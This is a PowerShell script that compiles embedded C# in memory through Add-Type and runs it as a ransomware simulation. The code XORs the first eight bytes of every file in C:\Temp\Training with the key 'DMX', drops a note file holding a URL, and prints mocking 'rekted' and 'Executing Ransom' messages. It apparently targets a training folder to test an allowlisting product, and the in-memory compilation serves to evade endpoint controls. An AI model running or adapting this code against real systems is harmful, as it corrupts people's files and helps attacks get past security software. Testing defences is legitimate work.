# Created: 2025-03-28 22:45:00
# Author: Lenard-Code

# Define the C# code with fixed string formatting (no string interpolation)
$csharpCode = @'
using System;
using System.IO;
using System.Text;

namespace MemoryExecutor
{
    public class FileProcessor
    {
        // Key for XOR operation
        private static readonly byte[] XorKey = Encoding.ASCII.GetBytes("DMX");
        
        // Main method to process files
        public static string ProcessFiles()
        {
            try
            {
                string targetDirectory = @"C:\Temp\Training";
                string outputFilePath = Path.Combine(targetDirectory, "ThreetLocker-Get-Maas.txt");
                
                // Check if directory exists
                if (!Directory.Exists(targetDirectory))
                {
                    return string.Format("Error: Directory {0} does not exist.", targetDirectory);
                }
                
                // Process all files in the directory
                int filesProcessed = 0;
                foreach (string filePath in Directory.GetFiles(targetDirectory))
                {
                    // Skip the output file if it already exists
                    if (Path.GetFileName(filePath).Equals("ThreetLocker-Get-Maas.txt", StringComparison.OrdinalIgnoreCase))
                        continue;
                        
                    ProcessSingleFile(filePath);
                    filesProcessed++;
                }
                
                // Create the text file
                File.WriteAllText(outputFilePath, "https://threatlockerunlocker.lol");
                
                return string.Format("Successfully rekted {0} files and created ThreetLocker-Get-Maas.txt, We do it for the gram", filesProcessed);
            }
            catch (Exception ex)
            {
                return string.Format("Error occurred: {0}", ex.Message);
            }
        }
        
        // Process a single file by XORing the first 8 bytes
        private static void ProcessSingleFile(string filePath)
        {
            byte[] fileBytes = File.ReadAllBytes(filePath);
            
            // Only process if file has content
            if (fileBytes.Length > 0)
            {
                // XOR up to the first 8 bytes
                int bytesToProcess = Math.Min(8, fileBytes.Length);
                
                for (int i = 0; i < bytesToProcess; i++)
                {
                    fileBytes[i] = (byte)(fileBytes[i] ^ XorKey[i % XorKey.Length]);
                }
                
                // Write modified bytes back to the file
                File.WriteAllBytes(filePath, fileBytes);
            }
        }
    }
}
'@

# Compile in memory using Add-Type
try {
    Write-Output "[+] Compiling ..."
    Add-Type -TypeDefinition $csharpCode
    Write-Output "[+] Get_r#kTEd Success!!"
    
    # Execute the code
    Write-Output "Executing Ransom ..."
    $result = [MemoryExecutor.FileProcessor]::ProcessFiles()
    Write-Output "Result: $result"
} catch {
    Write-Error "Failed to compile or execute: $_"
}